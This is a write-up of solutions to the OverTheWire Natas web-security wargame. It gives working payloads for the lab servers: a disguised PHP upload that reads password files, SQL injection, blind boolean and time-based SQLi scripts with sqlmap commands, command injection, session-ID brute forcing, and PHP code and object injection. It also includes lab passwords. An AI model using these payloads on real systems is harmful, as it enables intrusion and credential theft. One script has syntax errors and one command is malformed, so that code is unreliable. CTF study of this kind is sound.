# OverTheWire - Natas

## Level 8 -> 9

```sh
echo "encodedsecret" | xxd -r -p | rev | base64 -d
```

## Level 11 -> 12

A XOR B = C and C XOR B = A,

or Original_data XOR Key = Encrypted_data

and Original_data XOR Encrypted_data = Key.

## Level 13 -> 14

From PHP manual, [exif_imagetype()](https://www.php.net/manual/en/function.exif-imagetype.php) reads the first bytes of an image and checks its signature.
Images signatures can be found on <https://en.wikipedia.org/wiki/List_of_file_signatures>.

Add the signature bytes at the top of the file:

```sh
echo '\xFF\xD8\xFF\xEE' > hello.php
echo "<? passthru('cat /etc/natas_webpass/natas14') ?>" >> hello.php
```

Edit extension of filename submitted via hidden field in html to php and upload the file.

## Level 14 -> 15

Use SQL injection to generate this SQL Query: `SELECT * from users where username="whatever" and password="" OR "1"="1"`.

## Level 15 -> 16

Introduction to [Blind SQL Injection](https://owasp.org/www-community/attacks/Blind_SQL_Injection), here a boolean based one.

Retrieve the password by asking questions!

### Using custom script

```python
import urllib.request

from string import ascii_letters, digits
from urllib.request import HTTPBasicAuthHandler, HTTPPasswordMgrWithDefaultRealm

CHARS=ascii_letters + digits
URI='http://natas15.natas.labs.overthewire.org/?debug'

auth_handler = HTTPBasicAuthHandler(HTTPPasswordMgrWithDefaultRealm())
auth_handler.add_password(
	realm=None,
	uri=URI,
	user='natas15',
	passwd='AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J')
opener = urllib.request.build_opener(auth_handler)

def request(query):
	data = urllib.parse.urlencode({ 'username': f'{query}' })
	data = data.encode('ascii')
	req = urllib.request.Request(url=URI, data=data, method='POST')
	with opener.open(req) as f:
		res = f.read().decode('utf-8')
		return c if "this user exists" in res.lower() else None

filtered=''
for c in CHARS:
	query = f'natas16" AND password LIKE BINARY "%{c}%'
	result = request(query)
	if not result is None:
		filtered = filtered + c

found = ''
password=''
while password == '' or not found == '':
	found = ''
	for c in filtered:
		query = f'natas16" AND password LIKE BINARY "{password}{c}%'
		result = request(query)
		if not result is None:
			found = result
			break
	password = password + found
	print(password)
```

### Using sqlmap

```sh
# data: Data string to be sent through POST (e.g. "id=1")
# string: String to match when query is evaluated to True
# technique: Boolean-based blind - see https://github.com/sqlmapproject/sqlmap/wiki/Techniques
# D, T, C: database, table(s), column(s) to enumerate
sqlmap -u http://natas15.natas.labs.overthewire.org/?debug \
  --auth-type=Basic \
  --auth-cred=natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J \
  --data="username=natas16" \
  --dbms=mysql \
  --technique=B \
  --string="This user exists" \
  -D natas15 -T users -C username,password --dump
```

## Level 16 -> 17

Similar to the previous level, boolean based injection can be used.
Need to ask: does /etc/natas_webpass/natas17 contains letter a?

Input: needled$(grep a /etc/natas_webpass/natas17)

Output if Yes: empty

Output if No: needled

```python
import urllib.request

from string import ascii_letters, digits
from urllib.request import HTTPBasicAuthHandler, HTTPPasswordMgrWithDefaultRealm
from time import sleep

CHARS=ascii_letters + digits

URI='http://natas16.natas.labs.overthewire.org/'

auth_handler = HTTPBasicAuthHandler(HTTPPasswordMgrWithDefaultRealm())
auth_handler.add_password(
	realm=None,
	uri=URI,
	user='natas16',
	passwd='WaIHEacj63wnNIBROHeqi3p9t0m5nhmh')
opener = urllib.request.build_opener(auth_handler)

def request(term):
	answer = "needled"
	query = f'$(grep {term} /etc/natas_webpass/natas17)'
	data = urllib.parse.urlencode({ 'needle': f'{answer}{query}' })
	data = data.encode('ascii')
	req = urllib.request.Request(url=URI, data=data, method='POST')
	with opener.open(req) as f:
		res = f.read().decode('utf-8')
		return c if not answer in res.lower() else None

filtered=''
for c in CHARS:
	result = request(c)
	if not result is None:
		filtered = filtered + c
		print(filtered)

found = ''
password=''
while password == '' or not found == '':
	found = ''
	for c in filtered:
		result = request('^' + password + c)
		if not result is None:
			found = result
			break
	password = password + found
	print(password)
```

## Level 17 -> 18


Another Blind SQL injection, now a time based one.

Question: SELECT * FROM users WHERE username="natas18" AND SLEEP(5) #

Answer: username exists, duration of the query is >= 5 seconds


Question: SELECT * FROM users WHERE username="no one by this name" AND SLEEP(5) #

Answer: username does not exists, duration of the query is < 5 seconds

### Using custom script

```python
import urllib.request
from string import ascii_letters, digits
from time import time
from urllib.request import (HTTPBasicAuthHandler,
                            HTTPPasswordMgrWithDefaultRealm)

CHARS=ascii_letters + digits
URI='http://natas17.natas.labs.overthewire.org/?debug'

auth_handler = HTTPBasicAuthHandler(HTTPPasswordMgrWithDefaultRealm())
auth_handler.add_password(
    realm=None,
    uri=URI,
    user='natas17',
    passwd='8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw')
opener = urllib.request.build_opener(auth_handler)

def request(term):
    sleep = 3
    query = f'natas18" AND password LIKE BINARY "{term}" AND SLEEP({sleep}) #'
    data = urllib.parse.urlencode({ 'username': f'{query}' })
    data = data.encode('ascii')
    req = urllib.request.Request(url=URI, data=data, method='POST')
    start = time()
    with opener.open(req) as f:
        duration = time() - start
        return duration >= sleep

filtered=''
for char in CHARS:
    if request(f'%{char}%'):
        filtered = filtered + char
        print(filtered)

password=''
found = False
while password == '' or found:
    for char in filtered:2
        term = f'{password}{char}%'
        found = request(term):
        if found:
            password = password + char
            break
    print(password)
```

### Using sqlmap

```sh
# technique: time-based blind - see https://github.com/sqlmapproject/sqlmap/wiki/Techniques
sqlmap -u http://natas17.natas.labs.overthewire.org/?debug
  --auth-type=Basic \
  --auth-cred=natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw \
  --data="username=natas18" \
  --dbms=mysql \
  --technique=T \
  -D natas17 -T users -C username,password --dump -level=3 --risk=3 -v 3
```

## Level 19 -> 20

PHPSESSID is hex encoded.

```sh
user="admin"

for id in {1..640}; do
        sessid=$(echo -n "$id-$user" | xxd -p)
        response=$(curl --cookie "PHPSESSID=$sessid" http://natas19.natas.labs.overthewire.org/?debug -u "natas19:4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs")
        [[ "$response" =~ "You are an admin" ]] && echo "$id" && echo "$response" && exit 0
done
```

## Level 20 -> 21

Injection of a "admin" => "1" key value pair via the form, using curl. Response will show the PHPSESSID that was injected.

```sh
echo "\n" | xxd -p
curl -v  http://natas20.natas.labs.overthewire.org/index.php?debug -u "natas20:eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF" -d "name=%0a%0aadmin 1"
curl -v  http://natas20.natas.labs.overthewire.org/index.php?debug -u "natas20:eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF" --cookie "PHPSESSID=<value>"
```

## Level 25 -> 26

Directory traversal is possible with "....//" instead of "../": if the latter is removed from the former, you end up with... ".../".

User-Agent is saved in a log file named after the user's session token by logRequest(), without being escaped. Could we inject some php there?

```php
User-Agent: <?php global $__MSG; $__MSG = file_get_contents("/etc/natas_webpass/natas26"); ?>
```

## Level 26 -> 27

Cookie injection with serialized `Logger` class. The object is unserialized into the `$drawing` variable: when its life ends, the destructor method is called.

```php
<?php
class Logger{
    private $logFile;
    private $initMsg;
    private $exitMsg;

    function __construct() {
        $this->initMsg="hello\n";
        $this->exitMsg="<?php echo file_get_contents('/etc/natas_webpass/natas27'); ?>";
        $this->logFile = "img/hello.php";
  }
}

echo base64_encode(serialize(new Logger()))."\n";
?>
```
